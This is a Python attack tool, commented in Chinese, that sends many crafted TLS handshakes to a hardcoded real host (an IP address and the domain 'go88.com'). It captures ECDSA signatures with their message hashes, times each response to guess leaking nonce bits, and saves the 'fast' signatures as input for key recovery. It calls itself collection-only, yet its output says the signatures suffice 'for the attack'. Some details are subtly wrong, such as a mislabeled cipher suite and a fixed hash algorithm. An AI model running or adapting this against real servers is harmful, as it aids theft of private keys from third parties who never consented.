#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ECDSA签名收集器 - 完整版
包含ServerKeyExchange签名捕获和正确的消息哈希计算
只收集数据，不执行攻击
"""

import socket
import ssl
import time
import hashlib
import struct
import json
import sys
import os
from typing import List, Dict, Tuple, Optional
import binascii

# ===== 配置参数 =====
TARGET_HOST = "125.212.254.149"  # 或 "go88.com"
TARGET_PORT = 443
TIME_THRESHOLD = 302.38  # ms，快慢响应分界线
TOTAL_SAMPLES = 1000  # 收集样本数
SAVE_RAW_DATA = True  # 是否保存原始数据

# TLS常量
TLS_HANDSHAKE = 0x16
TLS_CHANGE_CIPHER_SPEC = 0x14
TLS_ALERT = 0x15
TLS_APPLICATION_DATA = 0x17

# Handshake消息类型
HANDSHAKE_CLIENT_HELLO = 0x01
HANDSHAKE_SERVER_HELLO = 0x02
HANDSHAKE_CERTIFICATE = 0x0b
HANDSHAKE_SERVER_KEY_EXCHANGE = 0x0c
HANDSHAKE_SERVER_HELLO_DONE = 0x0e

# ECDSA曲线参数 (P-256)
P256_N = 0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551
P256_P = 0xFFFFFFFF00000001000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF
P256_B = 0x5AC635D8AA3A93E7B3EBBD55769886BC651D06B0CC53B0F63BCE3C3E27D2604B
P256_GX = 0x6B17D1F2E12C4247F8BCE6E563A440F277037D812DEB33A0F4A13945D898C296
P256_GY = 0x4FE342E2FE1A7F9B8EE7EB4A7C0F9E162BCE33576B315ECECBB6406837BF51F5

class TLSHandshakeCapture:
    """TLS握手捕获器 - 获取ServerKeyExchange签名"""
    
    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
        self.client_random = None
        self.server_random = None
        self.server_key_exchange_msg = None
        self.signature = None
        self.curve_info = None
        self.public_key = None
        
    def create_client_hello(self) -> bytes:
        """构造ClientHello消息"""
        # TLS 1.2
        version = struct.pack('>H', 0x0303)
        
        # 生成客户端随机数
        self.client_random = os.urandom(32)
        
        # Session ID (空)
        session_id = b'\x00'
        
        # 密码套件列表 - 优先ECDHE-ECDSA
        cipher_suites = struct.pack('>H', 6)  # 3个套件，每个2字节
        cipher_suites += struct.pack('>H', 0xc02b)  # TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256
        cipher_suites += struct.pack('>H', 0xc02c)  # TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384
        cipher_suites += struct.pack('>H', 0xc02f)  # TLS_ECDHE_ECDSA_WITH_AES_128_CCM
        
        # 压缩方法
        compression = b'\x01\x00'  # 1个方法：null
        
        # 扩展
        extensions = b''
        
        # SNI扩展
        sni_extension = self.build_sni_extension(self.host)
        extensions += sni_extension
        
        # 支持的曲线扩展
        curves_extension = self.build_supported_curves_extension()
        extensions += curves_extension
        
        # EC点格式扩展
        ec_point_formats = struct.pack('>HHB', 0x000b, 0x0002, 0x01) + b'\x00'  # uncompressed
        extensions += ec_point_formats
        
        # 签名算法扩展 (TLS 1.2)
        sig_algs = struct.pack('>HH', 0x000d, 0x0008)  # extension type and length
        sig_algs += struct.pack('>H', 0x0004)  # list length
        sig_algs += struct.pack('>H', 0x0403)  # ECDSA with SHA256
        sig_algs += struct.pack('>H', 0x0503)  # ECDSA with SHA384
        extensions += sig_algs
        
        extensions_length = struct.pack('>H', len(extensions))
        
        # 组装ClientHello
        client_hello = version + self.client_random + session_id
        client_hello += cipher_suites + compression
        client_hello += extensions_length + extensions
        
        # Handshake消息头
        handshake_header = struct.pack('>B', HANDSHAKE_CLIENT_HELLO)
        handshake_header += struct.pack('>I', len(client_hello))[1:]  # 3字节长度
        
        # TLS记录头
        tls_header = struct.pack('>B', TLS_HANDSHAKE)
        tls_header += struct.pack('>H', 0x0301)  # TLS 1.0 for compatibility
        tls_header += struct.pack('>H', len(handshake_header + client_hello))
        
        return tls_header + handshake_header + client_hello
    
    def build_sni_extension(self, hostname: str) -> bytes:
        """构建SNI扩展"""
        hostname_bytes = hostname.encode('ascii')
        sni_content = struct.pack('>BH', 0x00, len(hostname_bytes)) + hostname_bytes
        sni_list = struct.pack('>H', len(sni_content)) + sni_content
        return struct.pack('>HH', 0x0000, len(sni_list)) + sni_list
    
    def build_supported_curves_extension(self) -> bytes:
        """构建支持的椭圆曲线扩展"""
        curves = struct.pack('>H', 4)  # 2个曲线，每个2字节
        curves += struct.pack('>H', 0x0017)  # secp256r1 (P-256)
        curves += struct.pack('>H', 0x0018)  # secp384r1 (P-384)
        return struct.pack('>HH', 0x000a, len(curves)) + curves
    
    def parse_tls_record(self, data: bytes, offset: int = 0) -> Tuple[int, int, bytes]:
        """解析TLS记录"""
        if len(data) - offset < 5:
            return None, 0, b''
        
        record_type = data[offset]
        version = struct.unpack('>H', data[offset+1:offset+3])[0]
        length = struct.unpack('>H', data[offset+3:offset+5])[0]
        
        if len(data) - offset < 5 + length:
            return None, 0, b''
        
        payload = data[offset+5:offset+5+length]
        return record_type, 5 + length, payload
    
    def parse_handshake_message(self, data: bytes, offset: int = 0) -> Tuple[int, bytes]:
        """解析握手消息"""
        if len(data) - offset < 4:
            return None, b''
        
        msg_type = data[offset]
        length = struct.unpack('>I', b'\x00' + data[offset+1:offset+4])[0]
        
        if len(data) - offset < 4 + length:
            return None, b''
        
        payload = data[offset+4:offset+4+length]
        return msg_type, payload
    
    def parse_server_hello(self, data: bytes):
        """解析ServerHello消息"""
        if len(data) < 35:
            return
        
        # 跳过版本(2字节)
        self.server_random = data[2:34]
        
        # 跳过session ID
        session_id_len = data[34]
        offset = 35 + session_id_len
        
        # 密码套件
        if offset + 2 <= len(data):
            cipher_suite = struct.unpack('>H', data[offset:offset+2])[0]
            print(f"    协商的密码套件: 0x{cipher_suite:04x}")
    
    def parse_server_key_exchange(self, data: bytes):
        """解析ServerKeyExchange消息（ECDHE）"""
        self.server_key_exchange_msg = data
        offset = 0
        
        # EC Diffie-Hellman Server Params
        if len(data) < 4:
            return
        
        # 曲线类型 (1字节) - 应该是0x03 (named_curve)
        curve_type = data[offset]
        offset += 1
        
        if curve_type != 0x03:
            print(f"    非命名曲线: {curve_type}")
            return
        
        # 曲线ID (2字节)
        curve_id = struct.unpack('>H', data[offset:offset+2])[0]
        offset += 2
        self.curve_info = curve_id
        
        # 公钥长度 (1字节)
        pubkey_len = data[offset]
        offset += 1
        
        # 公钥
        if offset + pubkey_len > len(data):
            return
        
        self.public_key = data[offset:offset+pubkey_len]
        offset += pubkey_len
        
        # 签名算法 (TLS 1.2)
        if offset + 2 > len(data):
            return
        
        sig_hash_algo = struct.unpack('>H', data[offset:offset+2])[0]
        offset += 2
        
        # 签名长度
        if offset + 2 > len(data):
            return
        
        sig_len = struct.unpack('>H', data[offset:offset+2])[0]
        offset += 2
        
        # 签名
        if offset + sig_len > len(data):
            return
        
        signature_bytes = data[offset:offset+sig_len]
        
        # 解析DER编码的ECDSA签名
        self.signature = self.parse_ecdsa_signature(signature_bytes)
        
        if self.signature:
            r, s = self.signature
            print(f"    ECDSA签名提取成功:")
            print(f"      r = 0x{r:064x}")
            print(f"      s = 0x{s:064x}")
    
    def parse_ecdsa_signature(self, der_bytes: bytes) -> Optional[Tuple[int, int]]:
        """解析DER编码的ECDSA签名"""
        try:
            if not der_bytes or der_bytes[0] != 0x30:  # SEQUENCE
                return None
            
            # 获取序列长度
            seq_len = der_bytes[1]
            if seq_len & 0x80:  # 长形式
                len_bytes = seq_len & 0x7f
                seq_len = int.from_bytes(der_bytes[2:2+len_bytes], 'big')
                offset = 2 + len_bytes
            else:
                offset = 2
            
            # 解析r
            if der_bytes[offset] != 0x02:  # INTEGER
                return None
            
            r_len = der_bytes[offset + 1]
            r_bytes = der_bytes[offset + 2:offset + 2 + r_len]
            r = int.from_bytes(r_bytes, 'big')
            
            offset += 2 + r_len
            
            # 解析s
            if der_bytes[offset] != 0x02:  # INTEGER
                return None
            
            s_len = der_bytes[offset + 1]
            s_bytes = der_bytes[offset + 2:offset + 2 + s_len]
            s = int.from_bytes(s_bytes, 'big')
            
            return (r, s)
            
        except Exception as e:
            print(f"    DER解析错误: {e}")
            return None
    
    def compute_message_hash(self) -> bytes:
        """计算ServerKeyExchange的消息哈希"""
        if not all([self.client_random, self.server_random, self.server_key_exchange_msg]):
            return None
        
        # 对于ECDHE_ECDSA，签名覆盖:
        # ClientHello.random + ServerHello.random + ServerKeyExchange.params
        
        # ServerKeyExchange.params是曲线信息和公钥（不包括签名部分）
        # 找到签名开始的位置
        params_len = 1 + 2 + 1 + len(self.public_key)  # curve_type + curve_id + pubkey_len + pubkey
        params = self.server_key_exchange_msg[:params_len]
        
        # 构造待签名消息
        message = self.client_random + self.server_random + params
        
        # 计算SHA256哈希（根据签名算法可能是SHA256或SHA384）
        h = hashlib.sha256(message).digest()
        
        return h
    
    def capture_handshake(self) -> Dict:
        """执行握手并捕获签名"""
        result = {
            'time_ms': 0,
            'signature': None,
            'message_hash': None,
            'curve': None,
            'public_key': None,
            'error': None
        }
        
        try:
            # 记录开始时间
            start_time = time.perf_counter()
            
            # 创建socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.host, self.port))
            
            # 发送ClientHello
            client_hello = self.create_client_hello()
            sock.send(client_hello)
            
            # 接收服务器响应
            response = b''
            while len(response) < 4096:  # 最多读4KB
                chunk = sock.recv(4096 - len(response))
                if not chunk:
                    break
                response += chunk
                
                # 检查是否收到ServerHelloDone
                if b'\x0e\x00\x00\x00' in response:  # ServerHelloDone标记
                    break
            
            # 记录响应时间
            elapsed = (time.perf_counter() - start_time) * 1000
            result['time_ms'] = elapsed
            
            # 解析响应
            offset = 0
            while offset < len(response):
                record_type, consumed, payload = self.parse_tls_record(response, offset)
                if not record_type:
                    break
                
                offset += consumed
                
                if record_type == TLS_HANDSHAKE:
                    # 解析握手消息
                    hs_offset = 0
                    while hs_offset < len(payload):
                        msg_type, msg_data = self.parse_handshake_message(payload, hs_offset)
                        if not msg_type:
                            break
                        
                        if msg_type == HANDSHAKE_SERVER_HELLO:
                            self.parse_server_hello(msg_data)
                        elif msg_type == HANDSHAKE_SERVER_KEY_EXCHANGE:
                            self.parse_server_key_exchange(msg_data)
                        
                        hs_offset += 4 + len(msg_data)
            
            sock.close()
            
            # 填充结果
            if self.signature:
                result['signature'] = self.signature
                result['message_hash'] = self.compute_message_hash()
                result['curve'] = self.curve_info
                result['public_key'] = self.public_key.hex() if self.public_key else None
            
        except Exception as e:
            result['error'] = str(e)
        
        return result

class SignatureCollector:
    """签名收集和分析器"""
    
    def __init__(self, target_host: str, target_port: int):
        self.target_host = target_host
        self.target_port = target_port
        self.samples = []
        self.fast_samples = []
        self.slow_samples = []
    
    def collect_sample(self) -> Dict:
        """收集单个样本"""
        capture = TLSHandshakeCapture(self.target_host, self.target_port)
        result = capture.capture_handshake()
        
        # 添加时序分类
        if result['time_ms'] > 0:
            result['is_fast'] = result['time_ms'] < TIME_THRESHOLD
        
        return result
    
    def collect_batch(self, count: int):
        """批量收集样本"""
        print(f"[*] 开始收集 {count} 个样本")
        print(f"[*] 目标: {self.target_host}:{self.target_port}")
        print(f"[*] 时序阈值: {TIME_THRESHOLD:.2f}ms")
        print("="*60)
        
        for i in range(count):
            print(f"\n[样本 {i+1}/{count}]")
            
            sample = self.collect_sample()
            
            if sample['error']:
                print(f"  ✗ 错误: {sample['error']}")
                continue
            
            self.samples.append(sample)
            
            # 分类
            if sample.get('is_fast'):
                self.fast_samples.append(sample)
                category = "快速"
            else:
                self.slow_samples.append(sample)
                category = "慢速"
            
            # 输出信息
            print(f"  ✓ 响应时间: {sample['time_ms']:.2f}ms ({category})")
            
            if sample['signature']:
                r, s = sample['signature']
                print(f"  ✓ 签名: r={hex(r)[:16]}..., s={hex(s)[:16]}...")
                
                if sample['message_hash']:
                    print(f"  ✓ 消息哈希: {sample['message_hash'].hex()[:32]}...")
            else:
                print(f"  ✗ 未能提取签名")
            
            # 进度统计
            if (i + 1) % 50 == 0:
                self.print_statistics()
            
            # 避免过快
            time.sleep(0.5)
    
    def print_statistics(self):
        """打印统计信息"""
        total = len(self.samples)
        fast = len(self.fast_samples)
        slow = len(self.slow_samples)
        
        print("\n" + "-"*40)
        print(f"[统计] 总计: {total}, 快速: {fast} ({fast/total*100:.1f}%), 慢速: {slow} ({slow/total*100:.1f}%)")
        
        if self.fast_samples and self.slow_samples:
            fast_avg = sum(s['time_ms'] for s in self.fast_samples) / len(self.fast_samples)
            slow_avg = sum(s['time_ms'] for s in self.slow_samples) / len(self.slow_samples)
            print(f"[时序] 快速平均: {fast_avg:.2f}ms, 慢速平均: {slow_avg:.2f}ms, 差异: {slow_avg-fast_avg:.2f}ms")
        
        # 检查签名提取率
        with_sig = sum(1 for s in self.samples if s.get('signature'))
        print(f"[签名] 成功提取: {with_sig}/{total} ({with_sig/total*100:.1f}%)")
        print("-"*40 + "\n")
    
    def analyze_msb_pattern(self):
        """分析MSB模式"""
        print("\n" + "="*60)
        print("MSB偏差分析")
        print("="*60)
        
        total = len(self.samples)
        fast = len(self.fast_samples)
        slow = len(self.slow_samples)
        
        if total == 0:
            print("无样本")
            return
        
        fast_ratio = fast / total
        deviation = abs(fast_ratio - 0.5)
        
        print(f"快速响应比例: {fast_ratio*100:.2f}%")
        print(f"慢速响应比例: {(1-fast_ratio)*100:.2f}%")
        print(f"偏离50%: {deviation*100:.2f}%")
        
        if deviation < 0.05:
            print("✓ 检测到明显的二元分布！")
            print("✓ 可能存在MSB泄露")
            
            # 分析签名
            fast_with_sig = sum(1 for s in self.fast_samples if s.get('signature'))
            slow_with_sig = sum(1 for s in self.slow_samples if s.get('signature'))
            
            print(f"\n快速组签名: {fast_with_sig}个")
            print(f"慢速组签名: {slow_with_sig}个")
            
            if fast_with_sig >= 100:
                print(f"\n[!] 有足够的快速响应签名用于攻击！")
                print(f"[!] 这{fast_with_sig}个签名的nonce MSB可能都是0")
        else:
            print("⚠ 分布不够接近50/50")
    
    def save_results(self, filename: str = None):
        """保存结果"""
        if not filename:
            filename = f"ecdsa_signatures_{self.target_host}_{int(time.time())}.json"
        
        # 准备数据
        output = {
            'target': f"{self.target_host}:{self.target_port}",
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'threshold_ms': TIME_THRESHOLD,
            'statistics': {
                'total_samples': len(self.samples),
                'fast_samples': len(self.fast_samples),
                'slow_samples': len(self.slow_samples),
                'fast_ratio': len(self.fast_samples) / len(self.samples) if self.samples else 0,
                'with_signature': sum(1 for s in self.samples if s.get('signature'))
            },
            'samples': self.samples
        }
        
        # 转换签名为可序列化格式
        for sample in output['samples']:
            if sample.get('signature'):
                r, s = sample['signature']
                sample['signature'] = {
                    'r': hex(r),
                    's': hex(s)
                }
            if sample.get('message_hash'):
                sample['message_hash'] = sample['message_hash'].hex()
        
        # 保存
        with open(filename, 'w') as f:
            json.dump(output, f, indent=2)
        
        print(f"\n✓ 数据已保存到: {filename}")
        
        # 额外保存快速响应签名
        if self.fast_samples:
            fast_filename = filename.replace('.json', '_fast_only.json')
            fast_data = {
                'target': output['target'],
                'timestamp': output['timestamp'],
                'threshold_ms': TIME_THRESHOLD,
                'count': len(self.fast_samples),
                'signatures': []
            }
            
            for sample in self.fast_samples:
                if sample.get('signature'):
                    r, s = sample['signature']
                    fast_data['signatures'].append({
                        'r': hex(r),
                        's': hex(s),
                        'h': sample['message_hash'].hex() if sample.get('message_hash') else None,
                        'time_ms': sample['time_ms']
                    })
            
            with open(fast_filename, 'w') as f:
                json.dump(fast_data, f, indent=2)
            
            print(f"✓ 快速响应签名已保存到: {fast_filename}")

def main():
    """主函数"""
    print("="*60)
    print("ECDSA签名收集器 - ServerKeyExchange捕获")
    print("="*60)
    print(f"目标: {TARGET_HOST}:{TARGET_PORT}")
    print(f"计划收集: {TOTAL_SAMPLES} 个样本")
    print(f"时序阈值: {TIME_THRESHOLD}ms")
    print("="*60)
    
    # 创建收集器
    collector = SignatureCollector(TARGET_HOST, TARGET_PORT)
    
    try:
        # 收集样本
        collector.collect_batch(TOTAL_SAMPLES)
        
        # 分析结果
        collector.analyze_msb_pattern()
        
        # 保存数据
        collector.save_results()
        
        print("\n" + "="*60)
        print("收集完成")
        print("="*60)
        
    except KeyboardInterrupt:
        print("\n\n[!] 用户中断")
        if collector.samples:
            print("[*] 保存已收集的数据...")
            collector.save_results()
    except Exception as e:
        print(f"\n[!] 错误: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()